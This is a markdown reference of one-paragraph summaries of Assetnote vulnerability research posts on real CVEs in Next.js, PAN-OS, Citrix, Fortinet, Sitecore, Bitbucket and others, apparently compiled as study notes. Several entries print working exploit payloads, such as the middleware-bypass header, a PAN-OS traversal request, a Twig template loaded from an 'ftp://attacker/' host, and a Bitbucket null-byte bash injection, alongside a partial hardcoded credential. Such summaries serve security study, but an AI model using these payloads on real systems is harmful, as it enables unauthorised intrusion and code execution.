# Assetnote Research — Per-Blog Summaries

One-paragraph extracts of every post (sourced from assetnote.io/resources/research).
Use this as a reference when the BOOK references a specific CVE or blog.

---

## Recent / Flagship

### CVE-2025-29927 — Next.js Middleware Bypass
**Class:** Auth bypass via header. **Stack:** Next.js <15.2.3 / <14.2.25 / <13.5.9. **Root cause:** `x-middleware-subrequest` header lets attacker bypass middleware authentication. **Exploit:** `x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware` (polyglot covering middleware paths). **Lesson:** Internal/transport headers leaking to clients = security primitive. Always check what headers a framework treats as trusted.

### CVE-2025-0108 — PAN-OS Path Confusion
**Class:** Auth bypass via path confusion (Nginx → Apache). **Root cause:** Nginx routes `/unauth/` as anonymous, Apache double-decodes `%252e%252e/` and rewrites to a privileged endpoint while preserving `X-pan-AuthCheck: off`. **Exploit:** `GET /unauth/%252e%252e/php/ztp_gate.php/PAN_help/x.css`. **Lesson:** When two HTTP layers normalize paths differently → almost always exploitable.

### Craft CMS PHP Footgun → RCE
**Class:** Path traversal + Twig SSTI. **Root cause:** `$_SERVER['argv']` populated outside CLI when `register_argc_argv=On` (PHP default); `?--templatesPath=ftp://attacker/` loads attacker template. **Exploit:** Twig `['system','id']|sort('call_user_func')` chain. **Lesson:** Validate execution context with `PHP_SAPI`, not just variable presence.

### CVE-2024-8534 — Citrix NetScaler RDP DoS (heap)
**Class:** Memory corruption. **Root cause:** TPKT/RDP length field not bounded; patched version added `if (0x200 < uVar14)`. **Exploit:** Send oversized RDP packet. **Lesson:** Bindiff for added bounds checks tells you the input range.

### Sitecore Order-of-Ops RCE (CVE-2024-46938)
**Class:** Validate-before-strip. **Root cause:** Bundle endpoint checks `.js` extension on `?f=path%23.js` *before* fragment is stripped. **Exploit:** read web.config → extract machineKey → ViewState RCE.

### Great Firewall DNS Poisoning
**Class:** DNS pool takeover. **Root cause:** GFW returns random IPs (instead of NXDOMAIN) for keyword-blocked domains. **Exploit:** Claim those IPs on Fastly/cPanel → serve content to Chinese users.

### ServiceNow Triple-Chain
**Class:** Jelly SSTI. **Root cause:** Two-phase template rendering (`${}` then `$[]`); `<g:no_escape>` in templates; `jvar_*` query-param autobind. **Exploit:** `jvar_page_title=<style><j:jelly xmlns:g='glide'><g:evaluate>...</g:evaluate></j:jelly></style>`.

### CVE-2024-34102 — Magento XXE via Nested Deser
**Root cause:** Recursive JSON-to-object deserialization can instantiate `SimpleXMLElement` via constructor matching. **Exploit:** Nested JSON to `totalsReader → collectorList → ... → sourceData` reaching XXE sink. **Lesson:** Frameworks with reflection-based JSON parsers create gadget chains.

### CVE-2024-34351 — Next.js SSRF
**Root cause:** Server Action redirect uses raw `req.headers['host']`. **Exploit:** Modified Host header + Next-Action → SSRF; respond with `Content-Type: text/x-component` to redirect into internals.

### CVE-2024-21762 — FortiGate Chunked Transfer RCE
**Class:** OOB write. **Root cause:** Chunked-encoding offset not bounds-checked; only 2-byte (`\x0a\x0d`) write but enough to redirect heap pointer. **Exploit:** ROP via SSL_do_handshake → execl("/bin/node", reverse shell). **Lesson:** Bindiff revealed the new length check.

### Citrix Saga (CVE-2023-5914 + 6184)
- 5914: XSS via SAML XML exception messages.
- 6184: .NET Remoting `typeFilterLevel="Full"` → ysoserial.net deserialize → RCE.

---

## SSRF / Glossary class

### Blind SSRF Glossary
Catalog of services to chain SSRF into RCE — WebLogic UDDI, Confluence OGNL, Jenkins Groovy, Redis (gopher://), Memcache, Druid. **Tool:** Gopherus.

### CVE-2022-26135 — Jira Mobile Plugin SSRF
**Root cause:** `URI.create(baseUrl + userInput)` with `@` injection. POST `/rest/nativemobile/1.0/batch` with `{"location":"@target"}`. **Lesson:** Service-Desk open signup converts post-auth bugs to pre-auth.

### CVE-2021-39303 / 40809 — Jamf Pro SSRF
`/eduFeatureSettingsTest.ajax?imageUrl=` returns base64 of fetched URL (full-read SSRF). Hunt by sink-grepping HTTPUtils wrapper across the codebase.

### CVE-2021-22054 — VMware Workspace ONE UEM SSRF
`BlobHandler.ashx` decrypts `Url` param using *hardcoded* AES master key. Find key in DLL → encrypt malicious URL → SSRF to AWS metadata.

### CVE-2021-22056 — VMware Workspace ONE Access SSRF
Path concat: `"https://" + hostname + path` — `path=@attacker.com` redirects auth tokens.

### CVE-2021-27748 — WebSphere Portal SSRF
Whitelisted-domain redirect chain (Lotus Domino `?Logout&RedirectTo=`). Multiple proxy paths: `/wps/proxy/`, `/docpicker/internal_proxy/`.

### Netlify IPX SSRF + Persistent XSS
User-controlled `x-forwarded-proto` constructs final URL; `isLocal` flag bypasses whitelist. SVG with embedded JS cached and served.

### CVE-2024-21893 — Pulse Secure SAML xmltooling SSRF
`RetrievalMethod` element in KeyInfo dereferences arbitrary URL during XML signature validation. Chains into existing command injection → root RCE.

### Jamf — Discovering Full-Read SSRF
Methodology: identify HTTP utility classes, grep usage, map post-auth → pre-auth chains.

### CVE-2021-22056 (deeper analysis — JWT theft)
Same SSRF used to steal admin JWTs via image tags + CSRF.

---

## Memory corruption

### CVE-2023-3519 (3 parts) — Citrix NetScaler
- Part 1: SAML CanonicalizationMethod array bound check missing → memory corruption.
- Part 2: `/gwtest/formssso` `target` param → stack overflow (no canary, no NX) → 168-byte buffer.
- Part 3: Working exploit writing PHP webshell to `/var/vpn/theme/x.php` via FreeBSD syscalls.

### CVE-2023-4966 — Citrix Bleed
Misuse of `snprintf` return value in `ns_aaa_oauth_send_openid_config`. Oversized `Host` header (24,812 chars) → response leaks heap → session tokens.

### CVE-2022-26318 — WatchGuard Firebox RCE
`strcat` of unbounded XML element name into fixed buffer. Heap overflow into SAX handler function pointer. ROP chain via libc + wgagent → shellcode on executable stack.

---

## Deserialization / RCE

### CVE-2021-42237 — Sitecore `Report.ashx` (NetDataContractSerializer)
ysoserial.net `TypeConfuseDelegate` → unauth RCE.

### Sitecore Experience Platform Pre-Auth RCE (companion blog)
Deeper version of 42237.

### CVE-2022-47986 — Aspera Faspex YAML.load
`external_emails` parameter passed to `YAML.load()`. Ruby gadget chain (Gem::Installer → Gem::Requirement → ...). Unauth RCE.

### CVE-2023-40044 — WS_FTP Ad Hoc HTTP Module RCE
`MyFileUpload.UploadModule` runs *before* auth filter. Multipart with no `filename` triggers `BinaryFormatter.Deserialize`. ysoserial.net payload → RCE.

### CVE-2023-34362 — MOVEit (2 blogs)
Header-smuggled session-variable injection (`SetAllSessionVarsFromHeaders` no longer applied) → SQL injection in guest workflow → admin session → BinaryFormatter on resumable upload comment field → RCE.

### Sitecore 9.3 (3 RCEs, 2 auth bypasses)
- `Server.Execute()` re-dispatches without re-auth.
- Unsafe reflection in controller instantiation.
- BinaryFormatter via `SimulatorController.Preview` → leak machineKey from config backup → Telerik CVE-2019-18935 ViewState RCE.

### CVE-2023-38646 — Metabase Pre-Auth RCE
Setup token leaked at `/api/session/properties` post-install (refactor regression). Combined with H2 JDBC `TRACE_LEVEL_SYSTEM_OUT` SQLi → JS triggers → RCE.

### Yellowfin BI (CVE-2022-47882/884/885)
Three hardcoded keys: RSA in StoryBoardAction, AES in JsAPI servlet, JWT in REST API. Forge auth → JNDI gadget via datasource → RCE.

---

## Auth bypass / logic / config

### Dynamicweb CVE-2022-25369
`&&` instead of `||` in setup-completion check. `?Action=createadministrator` creates admin post-deploy. ASPX webshell via admin panel.

### Dynamicweb (companion blog)
Same bug, deeper analysis.

### CVE-2022-22972 — VMware Workspace ONE Access Auth Bypass
`getServerName()` (Host header) used to construct internal validation URL. Attacker-controlled host returns 200 → "auth success". Lesson: Java's `getServerName()` is user-controlled.

### Sitecore IIS Auth Bypass via `Server.Execute()`
.NET method silently re-dispatches request without re-authorization.

### Pulse Secure CVE-2023-46805 + CVE-2024-21887
Prefix-only `strncmp(path, "/api/v1/totp/user-backup-code", 0x1d)` → `../../` after the prefix bypasses auth. License endpoint then `subprocess.Popen(... shell=True)` → RCE.

### Cloudflare Pages (3 parts)
1. Command injection in build pipeline via shell-metachar in repo dir name.
2. Azure DevOps `##vso[task.setvariable]` injection → privilege escalation → docker socket → container escape.
3. Kubelet API on port 10255 from build pod → leak `GIT_CREDS` → cross-tenant access.

### Azure DevOps 1-Click Account Takeover
Dangling DNS zone `project-cascade.visualstudio.com` (NS pointed to unregistered Azure zone). Combined with permissive `*.visualstudio.com` matching for OAuth `reply_to` → token theft.

### dotCMS CVE-2022-26352
Multipart `filename="../../../webapps/ROOT/...jsp"` directory traversal. JSP webshell.

### dotCMS Bank Bug (0-day at a real bank)
Pre-disclosure variant of 26352 found during a bank engagement; story of asset discovery → vendor identification → installer → bug.

### Bitbucket CVE-2022-36804
`/archive` `prefix=` param into `NuProcessBuilder` which splits args on null bytes. `prefix=x%00--exec=/bin/bash+-c+'id'%00--remote=file:///%00x` → RCE.

### CVE-2023-21932 — Oracle Opera Pre-Auth RCE
Sanitization performed *before* decryption (wrong order). Encrypted path-traversal in `username` of `FileReceiver` endpoint → CGI webshell upload.

### Oracle Opera (companion blog)
Order-of-operations bug deep dive.

### CVE-2023-24489 — ShareFile RCE
CBC encryption with no MAC → padding-oracle to brute valid padding (~256 reqs); then path traversal in `uploadId` → ASPX webshell. **Lesson:** encrypt ≠ authenticate.

### ShareFile (companion blog)
Encryption/auth deep dive.

### CVE-2021-35232 — SolarWinds WHD HQL
Hardcoded credential `helpdesk91114AD77B4CDCD9E18771057190C08B:1A11E431...` enables `/helpdesk/assetReport/rawHQL` → arbitrary HQL → RCE.

### SolarWinds WHD (companion)
Helpdesk too helpful — methodology of finding hardcoded creds.

### CVE-2023-29489 — cPanel XSS
`/cpanelwebcall/[id]` reflects unsanitized error message; routes to ports 80/443/2082/2086+. Auto-update reduced impact.

### CVE-2023-24488 — Citrix Gateway CRLF/XSS
`/oauth/idp/logout?post_logout_redirect_uri=%0d%0a%0d%0a<script>...`.

### CVE-2023-40033 — Flarum LFI (blind file oracle)
`ImageManager->make()` accepts URLs and `php://filter` chains. `convert.iconv` + dechunk filters create blind oracle (500 if file content matches → byte-by-byte leak).

### Flarum (companion)
Blind file oracle technique.

### Avaya Aura Device Services
Pre-auth XSS via `<%=messageLabelVar%>`; RCE via WebDAV PUT with trivial `User-Agent: AVAYA` "auth".

### Aspera Faspex (companion)
Rails source review methodology + YAML gadget.

---

## Discovery / Recon

### Hacking on Bug Bounties for Four Years
Methodology: large-scale asset discovery (~18% of bugs from automation), continuous monitoring, deep program understanding, collaboration, foundations first.

### Kiterunner — Contextual Content Discovery
67k Swagger files compiled into context-aware request library; finds endpoints static wordlists miss.

### IIS ShortName + BigQuery
Use shortname scanner → query GitHub BigQuery dataset with regex to recover full filenames.

### Ghostbuster — Dangling Elastic IPs
Enumerate org's EIPs, cross-reference DNS records for IPs no longer in your accounts.

### React Native Android Attack Surface
Pull APK → unzip → `index.android.bundle` grep for Firebase keys → Pyrebase auth → access misconfigured DBs.

### Mozilla AWS Zero-Day (WebPageTest)
Found unauthenticated WebPageTest on Mozilla via continuous monitoring. Spoofed `HTTP_FASTLY_CLIENT_IP` (localhost) → ZIP upload → race extraction vs SecureDir cleanup → PHP RCE.

### Uber AMPScript ($23k)
ExactTarget subdomain exposed AMPScript eval interface. `LookupRows` extracted driver UUIDs/emails. Discovered through subdomain monitoring.

### Zendesk Github Dotfile Leak
Developer dotfiles in public repos leaked GCP / Artifactory creds. Got SSH on 150+ GCP projects. **Tool:** gitrob.

### Zoom Zero-Day Followup (CVE-2019-13567)
ZoomOpener's domain validation used `hasSuffix` → `baddomain.com/.zoom.us` bypassed. `/launch` endpoint downloaded `.terminal` → RCE.

### h2c Smuggling in the Wild
Reverse proxies forward `Upgrade: h2c` upgrade requests; subsequent HTTP/2 over the persistent connection bypasses WAF/auth/routing.

### GraphQL Exploitation Catalog
Introspection, schema suggestions (Clairvoyance), batched queries (BatchQL — "10k pin attempts"), CSRF, missing rate limits.

### WhatsUp Gold Chain
`[AllowAnonymous] RenderController` blind SSRF → leaks encrypted creds → serial-number-derived encryption key (also pre-auth) → decrypt → admin → file traversal via AlarmCustomizer.

### Static Site Generator Risk (Netlify)
"Static" build pipelines retain server-side risk — Netlify IPX user-controlled headers + SVG XSS distributed to thousands of sites by default plugin.

---

## Orphan / smaller advisories

- **CVE-2021-42237 advisory** (separate from research blog): same Sitecore bug, 1-paragraph advisory.
- **CVE-2023-38646 advisory**: Metabase 1-paragraph advisory.
- **CVE-2023-24489 advisory**: ShareFile 1-paragraph.
- **CVE-2023-24488 advisory**: Citrix Gateway 1-paragraph.
- **CVE-2023-21932 advisory**: Oracle Opera 1-paragraph.
- **CVE-2023-29489 advisory**: cPanel 1-paragraph.
- **CVE-2023-40044 advisory**: WS_FTP 1-paragraph.
- **CVE-2023-40033 advisory**: Flarum 1-paragraph.
- **WhatsUp Gold advisory**: bundles multiple CVEs from chain.
- **Jamf advisory**: 1-paragraph for 39303/40809.
- **Jira advisory CVE-2022-26135**: 1-paragraph.
- **VMware advisories 22054 / 22056**: 1-paragraph each.
- **Sitecore advisory 42237**: 1-paragraph.
- **WebSphere advisory 27748**: 1-paragraph.
- **dotCMS advisory 26352**: 1-paragraph.
- **Dynamicweb advisory 25369**: 1-paragraph.
- **SolarWinds advisory 35232**: 1-paragraph.

(See the full research blogs for details — advisories are abbreviated versions.)

---

*Generated 2026-05-09 from assetnote.io/resources/research sitemap. ~78 posts total.*
